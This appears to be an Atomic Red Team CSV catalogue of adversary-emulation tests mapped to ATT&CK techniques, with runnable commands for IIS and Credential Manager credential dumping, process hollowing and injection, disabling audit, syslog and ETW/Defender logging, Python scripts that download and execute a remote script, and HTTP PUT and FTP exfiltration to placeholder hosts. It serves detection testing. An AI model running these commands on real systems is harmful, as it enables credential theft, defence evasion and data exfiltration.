T1003,OS Credential Dumping,Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),42510244-5019-48fa-a0e5-66c3b76e6049,"AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",windows,,,C:\Windows\System32\inetsrv\appcmd.exe list apppool /config,powershell,True,,,powershell,"dependencies.0.description: IIS must be installed prior to running the test
dependencies.0.prereq_command: if ((Get-WindowsFeature Web-Server).InstallState -eq ""Installed"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: Install-WindowsFeature -name Web-Server -IncludeManagementTools
",
T1003,OS Credential Dumping,Dump Credential Manager using keymgr.dll and rundll32.exe,84113186-ed3c-4d0d-8a3c-8980c86c1f4a,"This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).
Reference: https://twitter.com/0gtweet/status/1415671356239216653",windows,,,"rundll32.exe keymgr,KRShowKeyMgr",powershell,,,,,,
T1055.012,Process Injection: Process Hollowing,Process Hollowing using PowerShell,562427b4-39ef-4e8c-af88-463a78e70b9c,"This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)
",windows,,,". ""$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1""
$ppid=Get-Process #{parent_process_name} | select -expand id
Start-Hollow -Sponsor ""#{sponsor_binary_path}"" -Hollow ""#{hollow_binary_path}"" -ParentPID $ppid -Verbose
",powershell,,,"Stop-Process -Name ""#{spawnto_process_name}"" -ErrorAction Ignore
",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow (executable that will run inside the sponsor)

input_arguments.hollow_binary_path.type: string

input_arguments.hollow_binary_path.default: C:\Windows\System32\cmd.exe

input_arguments.parent_process_name.description: Name of the parent process

input_arguments.parent_process_name.type: string

input_arguments.parent_process_name.default: explorer

input_arguments.sponsor_binary_path.description: Path of the sponsor binary (executable that will host the binary)

input_arguments.sponsor_binary_path.type: string

input_arguments.sponsor_binary_path.default: C:\Windows\System32\notepad.exe

input_arguments.spawnto_process_name.description: Name of the process to spawn

input_arguments.spawnto_process_name.type: string

input_arguments.spawnto_process_name.default: notepad

"
T1055.012,Process Injection: Process Hollowing,RunPE via VBA,3ad4a037-1598-4136-837c-4027e4fa319b,"This module executes notepad.exe from within the WINWORD.EXE process
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Exploit""
",powershell,,,,powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.ms_product.description: Maldoc application Word

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1055.012,Process Injection: Process Hollowing,Process Hollowing in Go using CreateProcessW WinAPI,c8f98fe1-c89b-4c49-a7e3-d60ee4bc2f5a,"Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.
- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)
",windows,,,"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program ""#{hollow_binary_path}"" -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
Stop-Process -Name ""#{hollow_process_name}"" -ErrorAction SilentlyContinue
",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow

input_arguments.hollow_binary_path.type: string

input_arguments.hollow_binary_path.default: C:\Windows\System32\werfault.exe

input_arguments.hollow_process_name.description: Name of the process to hollow

input_arguments.hollow_process_name.type: string

input_arguments.hollow_process_name.default: werfault

"
T1055.012,Process Injection: Process Hollowing,Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012),94903cc5-d462-498a-b919-b1e5ab155fee,"Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.
This test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe
allows for the retrieval of output generated from executed shellcode.
- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)
",windows,,,"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""#{hollow_binary_path}"" -debug
",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
Stop-Process -Name ""#{hollow_process_name}"" -ErrorAction SilentlyContinue",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow

input_arguments.hollow_binary_path.type: string

input_arguments.hollow_binary_path.default: C:\Windows\System32\werfault.exe

input_arguments.hollow_process_name.description: Name of the process to hollow

input_arguments.hollow_process_name.type: string

input_arguments.hollow_process_name.default: werfault

"
T1562.006,Impair Defenses: Indicator Blocking,Auditing Configuration Changes on Linux Host,212cfbcf-4770-4980-bc21-303e37abd0e3,"Emulates modification of auditd configuration files
",linux,,,"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}
if [ -f ""/etc/#{auditd_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}
else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}
fi 
sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}
",bash,True,,"sed -i '$ d' /etc/audisp/#{audisp_config_file_name}
if [ -f ""/etc/#{auditd_config_file_name}"" ];
then sed -i '$ d' /etc/#{auditd_config_file_name}
else sed -i '$ d' /etc/audit/#{auditd_config_file_name}
fi
sed -i '$ d' /etc/#{libaudit_config_file_name}
",,,"input_arguments.audisp_config_file_name.description: The name of the audispd configuration file to be changed

input_arguments.audisp_config_file_name.type: string

input_arguments.audisp_config_file_name.default: audispd.conf

input_arguments.auditd_config_file_name.description: The name of the auditd configuration file to be changed

input_arguments.auditd_config_file_name.type: string

input_arguments.auditd_config_file_name.default: auditd.conf

input_arguments.libaudit_config_file_name.description: The name of the libaudit configuration file to be changed

input_arguments.libaudit_config_file_name.type: string

input_arguments.libaudit_config_file_name.default: libaudit.conf

"
T1562.006,Impair Defenses: Indicator Blocking,Auditing Configuration Changes on FreeBSD Host,cedaf7e7-28ee-42ab-ba13-456abd35d1bd,"Emulates modification of auditd configuration files
",linux,,,"echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
",sh,True,,"sed -i """" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}
",,,"input_arguments.auditd_config_file_name.description: The name of the auditd configuration file to be changed

input_arguments.auditd_config_file_name.type: string

input_arguments.auditd_config_file_name.default: audit_event

"
T1562.006,Impair Defenses: Indicator Blocking,Logging Configuration Changes on Linux Host,7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c,"Emulates modification of syslog configuration.
",linux,,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}
fi
if [ -f ""/etc/#{rsyslog_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}
fi
if [ -f ""/etc/syslog-ng/#{syslog_ng_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}
fi
",bash,True,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
then sed -i '$ d' /etc/#{syslog_config_file_name}
fi
if [ -f ""/etc/#{rsyslog_config_file_name}"" ];
then sed -i '$ d' /etc/#{rsyslog_config_file_name}
fi
if [ -f ""/etc/syslog-ng/#{syslog_ng_config_file_name}"" ];
then sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}
fi
",,,"input_arguments.syslog_config_file_name.description: The name of the syslog configuration file to be changed

input_arguments.syslog_config_file_name.type: string

input_arguments.syslog_config_file_name.default: syslog.conf

input_arguments.rsyslog_config_file_name.description: The name of the rsyslog configuration file to be changed

input_arguments.rsyslog_config_file_name.type: string

input_arguments.rsyslog_config_file_name.default: rsyslog.conf

input_arguments.syslog_ng_config_file_name.description: The name of the syslog-ng configuration file to be changed

input_arguments.syslog_ng_config_file_name.type: string

input_arguments.syslog_ng_config_file_name.default: syslog-ng.conf

"
T1562.006,Impair Defenses: Indicator Blocking,Logging Configuration Changes on FreeBSD Host,6b8ca3ab-5980-4321-80c3-bcd77c8daed8,"Emulates modification of syslog configuration.
",linux,,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}
fi
",sh,True,,"if [ -f ""/etc/#{syslog_config_file_name}"" ];
then sed -i """" '/#art_test_1562_006_2/d' /etc/#{syslog_config_file_name}
fi
",,,"input_arguments.syslog_config_file_name.description: The name of the syslog configuration file to be changed

input_arguments.syslog_config_file_name.type: string

input_arguments.syslog_config_file_name.default: syslog.conf

"
T1562.006,Impair Defenses: Indicator Blocking,Disable Powershell ETW Provider - Windows,6f118276-121d-4c09-bb58-a8fb4a72ee84,"This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",windows,,,"cmd /c ""#{ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""#{session}"" --p ""#{provider}"" -ets",powershell,True,,"cmd /c ""#{ps_exec_location}"" -i -s cmd.exe /c logman update trace ""#{session}"" -p ""#{provider}"" -ets",powershell,"dependencies.0.description: PSExec must be installed on the machine.
dependencies.0.prereq_command: if (Test-Path ""#{ps_exec_location}"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PStools.zip""
expand-archive -literalpath ""PathToAtomicsFolder\..\ExternalPayloads\PStools.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\pstools"" -force
","input_arguments.ps_exec_location.description: Location of PSExec.

input_arguments.ps_exec_location.type: string

input_arguments.ps_exec_location.default: PathToAtomicsFolder\..\ExternalPayloads\pstools\PsExec.exe

input_arguments.session.description: The session to disable.

input_arguments.session.type: string

input_arguments.session.default: EventLog-Application

input_arguments.provider.description: The provider to disable.

input_arguments.provider.type: string

input_arguments.provider.default: Microsoft-Windows-Powershell

"
T1562.006,Impair Defenses: Indicator Blocking,Disable .NET Event Tracing for Windows Via Registry (cmd),8a4c33be-a0d3-434a-bee6-315405edbd5b,Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry,windows,,,REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0,command_prompt,True,,REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > nul 2>&1,,,
T1562.006,Impair Defenses: Indicator Blocking,Disable .NET Event Tracing for Windows Via Registry (powershell),19c07a45-452d-4620-90ed-4c34fffbe758,Disables ETW for the .NET Framework using PowerShell to update the Windows registry,windows,,,"New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force",powershell,True,,REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > $null 2>&1,,,
T1562.006,Impair Defenses: Indicator Blocking,LockBit Black - Disable the ETW Provider of Windows Defender -cmd,f6df0b8e-2c83-44c7-ba5e-0fa4386bec41,"An adversary can disable the ETW Provider of Windows Defender,
so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
",windows,,,"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /f >nul 2>&1
",,,
T1562.006,Impair Defenses: Indicator Blocking,LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,69fc085b-5444-4879-8002-b24c8e1a3e02,"An adversary can disable the ETW Provider of Windows Defender,
so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
",windows,,,"New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled  -PropertyType DWord -Value 0 -Force
",powershell,True,,"Remove-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -Force -ErrorAction Ignore
",,,
T1059.006,Command and Scripting Interpreter: Python,Execute shell script via python's command mode arguement,3a95cdb2-c6ea-4761-b24e-02b71889b8bb,Download and execute shell script and write to file then execute locally using Python -c (command mode),linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'
",sh,,,"rm #{payload_file_name} 
",sh,"dependencies.0.description: Verify if python is in the environment variable path and attempt to import requests library.
dependencies.0.prereq_command: which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?

dependencies.0.get_prereq_command: pip install requests

","input_arguments.script_url.description: Shell script public URL

input_arguments.script_url.type: string

input_arguments.script_url.default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh

input_arguments.payload_file_name.description: Name of shell script downloaded from the script_url

input_arguments.payload_file_name.type: string

input_arguments.payload_file_name.default: T1059.006-payload

input_arguments.executor.description: FreeBSD or Linux shell

input_arguments.executor.type: string

input_arguments.executor.default: sh

input_arguments.script_args.description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.

input_arguments.script_args.type: string

input_arguments.script_args.default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles

"
T1059.006,Command and Scripting Interpreter: Python,Execute Python via scripts,6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8,Create Python file (.py) that downloads and executes shell script via executor arguments,linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
echo 'import requests' > #{python_script_name}
echo 'import os' >> #{python_script_name}
echo 'url = ""#{script_url}""' >> #{python_script_name}
echo 'malicious_command = ""#{executor} #{payload_file_name} #{script_args}""' >> #{python_script_name}
echo 'session = requests.session()' >> #{python_script_name}
echo 'source = session.get(url).content' >> #{python_script_name}
echo 'fd = open(""#{payload_file_name}"", ""wb+"")' >> #{python_script_name}
echo 'fd.write(source)' >> #{python_script_name}
echo 'fd.close()' >> #{python_script_name}
echo 'os.system(malicious_command)' >> #{python_script_name}
$which_python #{python_script_name}
",sh,,,"rm #{python_script_name} #{payload_file_name}  
",sh,"dependencies.0.description: Requires Python

dependencies.0.prereq_command: which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?

dependencies.0.get_prereq_command: pip install requests    

","input_arguments.python_script_name.description: Python script name

input_arguments.python_script_name.type: path

input_arguments.python_script_name.default: T1059.006.py

input_arguments.script_url.description: Shell script public URL

input_arguments.script_url.type: string

input_arguments.script_url.default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh

input_arguments.payload_file_name.description: Shell script file name downloaded from the script_url

input_arguments.payload_file_name.type: string

input_arguments.payload_file_name.default: T1059.006-payload

input_arguments.executor.description: Payload or script interpreter / executor

input_arguments.executor.type: string

input_arguments.executor.default: sh

input_arguments.script_args.description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files

input_arguments.script_args.type: string

input_arguments.script_args.default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles

"
T1059.006,Command and Scripting Interpreter: Python,Execute Python via Python executables,0b44d79b-570a-4b27-a31f-3bf2156e5eaa,"Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments
",linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
echo 'import requests' > #{python_script_name}
echo 'import os' >> #{python_script_name}
echo 'url = ""#{script_url}""' >> #{python_script_name}
echo 'malicious_command = ""#{executor} #{payload_file_name} #{script_args}""' >> #{python_script_name}
echo 'session = requests.session()' >> #{python_script_name}
echo 'source = session.get(url).content' >> #{python_script_name}
echo 'fd = open(""#{payload_file_name}"", ""wb+"")' >> #{python_script_name}
echo 'fd.write(source)' >> #{python_script_name}
echo 'fd.close()' >> #{python_script_name}
echo 'os.system(malicious_command)' >> #{python_script_name}
$which_python -c 'import py_compile; py_compile.compile(""#{python_script_name}"", ""#{python_binary_name}"")'
$which_python #{python_binary_name}
",sh,,,"rm #{python_binary_name} #{python_script_name} #{payload_file_name}
",sh,"dependencies.0.description: Requires Python

dependencies.0.prereq_command: which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?

dependencies.0.get_prereq_command: pip install requests    

","input_arguments.python_script_name.description: Name of Python script name

input_arguments.python_script_name.type: path

input_arguments.python_script_name.default: T1059.006.py

input_arguments.script_url.description: URL hosting external malicious payload

input_arguments.script_url.type: string

input_arguments.script_url.default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh

input_arguments.payload_file_name.description: Shell script file name downloaded from the script_url

input_arguments.payload_file_name.type: string

input_arguments.payload_file_name.default: T1059.006-payload

input_arguments.executor.description: Payload or script interpreter / executor

input_arguments.executor.type: string

input_arguments.executor.default: sh

input_arguments.script_args.description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files

input_arguments.script_args.type: string

input_arguments.script_args.default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles

input_arguments.python_binary_name.description: Name of Python file to be compiled

input_arguments.python_binary_name.type: path

input_arguments.python_binary_name.default: T1059.006.pyc

"
T1059.006,Command and Scripting Interpreter: Python,Python pty module and spawn function used to spawn sh or bash,161d694c-b543-4434-85c3-c3a433e33792,"Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence
",linux,,,"which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c ""import pty;pty.spawn('/bin/sh')""
exit
$which_python -c ""import pty;pty.spawn('/bin/bash')""
exit",sh,,,,,"dependencies.0.description: Verify if python is in the environment variable path and attempt to import requests library.

dependencies.0.prereq_command: which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?          

dependencies.0.get_prereq_command: pip install requests

",
T1055.002,Process Injection: Portable Executable Injection,Portable Executable Injection,578025d5-faa9-4f6d-8390-aae739d503e1,"This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title ""Warning"" and the content ""Atomic Red Team"" after a few seconds.",windows,,,"Start-Process ""#{exe_binary}""
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",powershell,True,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: Portable Executable to inject must exist at specified location (#{exe_binary})

dependencies.0.prereq_command: if (Test-Path ""#{exe_binary}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{exe_binary}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe"" -OutFile ""#{exe_binary}""

","input_arguments.exe_binary.description: PE binary

input_arguments.exe_binary.type: path

input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.002\bin\RedInjection.exe

"
T1020,Automated Exfiltration,IcedID Botnet HTTP PUT,9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0,"Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file",windows,,,"$fileName = ""#{file}""
$url = ""#{domain}""
$file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""
$contentType = ""application/octet-stream""
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",powershell,,,"$fileName = ""#{file}""
Remove-Item -Path $fileName -ErrorAction Ignore",,,"input_arguments.file.description: Exfiltration File

input_arguments.file.type: string

input_arguments.file.default: C:\temp\T1020_exfilFile.txt

input_arguments.domain.description: Destination Domain

input_arguments.domain.type: url

input_arguments.domain.default: https://google.com

"
T1020,Automated Exfiltration,Exfiltration via Encrypted FTP,5b380e96-b0ef-4072-8a8e-f194cb9eb9ac,"Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.",windows,,,"$sampleData = ""Sample data for exfiltration test""
Set-Content -Path ""#{sampleFile}"" -Value $sampleData
$ftpUrl = ""#{ftpServer}""
$creds = Get-Credential -Credential ""#{credentials}""
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile ""#{sampleFile}"" -Credential $creds
",powershell,False,,"Remove-Item -Path ""#{sampleFile}"" -ErrorAction Ignore
",,,"input_arguments.sampleFile.description: Path of the sample file to exfiltrate.

input_arguments.sampleFile.type: String

input_arguments.sampleFile.default: C:\temp\T1020__FTP_sample.txt

input_arguments.ftpServer.description: FTP server URL.

input_arguments.ftpServer.type: Url

input_arguments.ftpServer.default: ftp://example.com

input_arguments.credentials.description: FTP server credentials.

input_arguments.credentials.type: String

input_arguments.credentials.default: [user:password]

"
T1083,File and Directory Discovery,File and Directory Discovery (cmd.exe),0e36303b-6762-4500-b003-127743b80ba6,"Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.
",windows,,,"dir /s c:\ >> #{output_file}
dir /s ""c:\Documents and Settings"" >> #{output_file}
dir /s ""c:\Program Files\"" >> #{output_file}
dir ""%systemdrive%\Users\*.*"" >> #{output_file}
dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> #{output_file}
dir ""%userprofile%\Desktop\*.*"" >> #{output_file}
tree /F >> #{output_file}
",command_prompt,,,"del #{output_file}
",,,"input_arguments.output_file.description: File to output results to

input_arguments.output_file.type: string

input_arguments.output_file.default: %temp%\T1083Test1.txt

"
T1083,File and Directory Discovery,File and Directory Discovery (PowerShell),2158908e-b7ef-4c21-8a83-3ce4dd05a924,"Find or discover files on the file system. Upon execution, file and folder information will be displayed.
",windows,,,"ls -recurse
get-childitem -recurse
gci -recurse
",powershell,,,,,,
T1083,File and Directory Discovery,Nix File and Directory Discovery,ffc8b249-372a-4b74-adcd-e4c0430842de,"Find or discover files on the file system

References:

http://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/

https://perishablepress.com/list-files-folders-recursively-terminal/
",linux,macos,,"ls -a >> #{output_file}
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
file */* *>> #{output_file}
cat #{output_file} 2>/dev/null
find . -type f
ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
",sh,,,"rm #{output_file}
",,,"input_arguments.output_file.description: Output file used to store the results.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1083.txt

"
T1083,File and Directory Discovery,Nix File and Directory Discovery 2,13c5e1ae-605b-46c4-a79f-db28c77ff24e,"Find or discover files on the file system
",linux,macos,,"cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
find . -type f -iname *.pdf >> #{output_file}
cat #{output_file}
find . -type f -name "".*""
",sh,,,rm #{output_file},,,"input_arguments.output_file.description: Output file used to store the results.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1083.txt

"
T1083,File and Directory Discovery,Simulating MAZE Directory Enumeration,c6c34f61-1c3e-40fb-8a58-d017d88286d8,"This test emulates MAZE ransomware's ability to enumerate directories using Powershell. 
Upon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. 
See https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents
",windows,,,"$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming"")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}
Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append #{File_to_output}
$UsersFolder = ""$env:homedrive\Users\""
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) 
{
foreach ($secondarydirectory in $folderarray)
 {Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}
}
cat #{File_to_output}
",powershell,,,"remove-item #{File_to_output} -ErrorAction SilentlyContinue
",,,"input_arguments.File_to_output.description: File to output results to

input_arguments.File_to_output.type: string

input_arguments.File_to_output.default: $env:temp\T1083Test5.txt

"
T1083,File and Directory Discovery,Launch DirLister Executable,c5bec457-43c9-4a18-9a24-fe151d8971b7,"Launches the DirLister executable for a short period of time and then exits.

Recently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",windows,,,"Start-Process ""#{dirlister_path}""
Start-Sleep -Second 4
Stop-Process -Name ""DirLister""
",powershell,,,,powershell,"dependencies.0.description: DirLister.exe must exist in the specified path #{dirlister_path}

dependencies.0.prereq_command: if (Test-Path ""#{dirlister_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: $parentpath = Split-Path ""#{dirlister_path}""
New-Item -ItemType Directory -Force -Path $parentpath | Out-Null
Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4\*"" ""$parentpath"" -Recurse
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"",""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4"" -Recurse -ErrorAction Ignore

","input_arguments.dirlister_path.description: Path to the DirLister executable 

input_arguments.dirlister_path.type: string

input_arguments.dirlister_path.default: PathToAtomicsFolder\..\ExternalPayloads\DirLister.exe

"
T1083,File and Directory Discovery,ESXi - Enumerate VMDKs available on an ESXi Host,4a233a40-caf7-4cf1-890a-c6331bbc72cf,"An adversary uses the find command to enumerate vmdks on an ESXi host.
[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)
",linux,,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
",command_prompt,False,,,powershell,"dependencies.0.description: Check if plink is available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to Plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

